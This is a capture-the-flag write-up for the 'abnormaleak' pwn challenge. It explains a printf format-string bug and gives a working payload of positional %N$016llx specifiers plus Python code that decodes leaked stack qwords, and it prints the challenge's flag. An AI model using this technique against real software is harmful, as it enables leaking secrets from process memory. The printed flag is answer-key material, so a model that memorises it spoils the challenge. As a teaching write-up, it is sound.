---
title: "CTF Write-up — abnormaleak (Format String + Stack Leak)"
description: "Binary: abnormaleak (ELF 64-bit, x86-64, dynamically linked, not stripped)"
event: "Hackthebooctf"
year: 2025
category: pwn
tags: ["pwn","format-string"]
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "hackthebooctf/pwn/abnormaleak"
featured: false
flagsHidden: false
---

> Imported from [hackthebooctf/pwn/abnormaleak](https://github.com/R3izorr/CTF_writeup/tree/main/hackthebooctf/pwn/abnormaleak).

# CTF Write-up — abnormaleak (Format String + Stack Leak)
## Overview

### Category: Pwn / Binary Exploitation

Binary: abnormaleak (ELF 64-bit, x86-64, dynamically linked, not stripped)

### Goal: Leak stack memory via a format-string primitive and reconstruct the flag from bytes loaded on the stack

### Final Flag: HTB{FmT_gh0uL}

Given / Recon
file abnormaleak
```bash
abnormaleak: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b06d2633e58ad89fd2d06cb7ba76e5cc280dd86e,
for GNU/Linux 3.2.0, not stripped
```
```bash
checksec --file=./abnormaleak

RELRO:    Full RELRO
Canary:   Canary found
NX:       NX enabled
PIE:      PIE enabled
RPATH:    No
RUNPATH:  No
Symbols:  61 symbols
FORTIFY:  Enabled (Fortified: 0, Fortifiable: 4)
```

### Implication: No straightforward control-flow hijack (PIE + canary + NX + full RELRO). The challenge is set up for information disclosure.

## Program Flow (decompiled summary)
```
Option 1: opens flag.txt and fgets into a stack buffer local_b8[32].

Option 3: does read(0, &local_98, 0x4f) into a stack buffer that will later be used as a format string.

Option 2: executes printf((char *)&local_98); — format-string bug.

A loop counter local_c1 limits attempts; the read into local_98 can clobber adjacent locals if not NUL-padded to exactly 0x4f bytes, causing the loop to break early.
```

### Key relevant lines (paraphrased):

 Option 1: load flag content onto stack
fgets(local_b8, 0x20, fopen("flag.txt","r"))

 Option 3: copy user bytes into stack buffer that is later used as a format string
read(0, &local_98, 0x4f)

 Option 2: use attacker-controlled string as format
printf((char *)&local_98)


### Vulnerability: classic printf(user_buf) format-string primitive.

## Strategy

- Load flag into stack using Option 1 (puts flag bytes into local_b8 on the stack frame).

- Install format string via Option 3: send a payload of exactly 0x4f bytes (NUL-padded), so the loop continues.

- Trigger leak via Option 2: printf(fmt) reads attacker format and prints stack words.

### Reconstruct bytes: print many consecutive qwords as 16-hex tokens using %N$016llx, convert each token to little-endian 8-byte sequence, concatenate, and scan for HTB{...}.

Because the stack is little-endian, each %llx token (big-endian text) must be byte-reversed to recover the original bytes.

### Example Payload (one batch)

Use positional specifiers for a stretch of arguments where the varargs live. Adjust indices as needed (example starts at 6):
```
%6$016llx %7$016llx %8$016llx %9$016llx %10$016llx %11$016llx %12$016llx %13$016llx
```

- Send this into Option 3, Pad to exactly 0x4f bytes with \x00.

- Then select Option 2 to print the leak.

- Repeat with additional ranges if needed: %14$016llx … %21$016llx, etc.


Decoding the Leak

Each printed token is a 16-hex qword (e.g., 414243440a000000). Convert to bytes and reverse to little-endian:
```python
def token_to_le_bytes(tok: str) -> bytes:
    return int(tok, 16).to_bytes(8, 'little')


Concatenate the bytes from consecutive stack slots in order, then search for the flag:

blob = b''.join(token_to_le_bytes(t) for t in tokens)
start = blob.find(b'HTB{')
end   = blob.find(b'}', start) + 1 if start != -1 else -1
flag  = blob[start:end].decode() if start != -1 and end != 0 else None
```
### Why NUL-Pad to 0x4f?

The vulnerable read(0, &local_98, 0x4f) is adjacent to other locals (e.g., the attempt counter local_c1). If you don’t NUL-pad up to exactly 0x4f, stack garbage or trailing bytes can corrupt local_c1, exiting before you can leak.

## Result

Using batched leaks and decoding, the concatenated little-endian bytes contain:

### HTB{FmT_gh0uL}



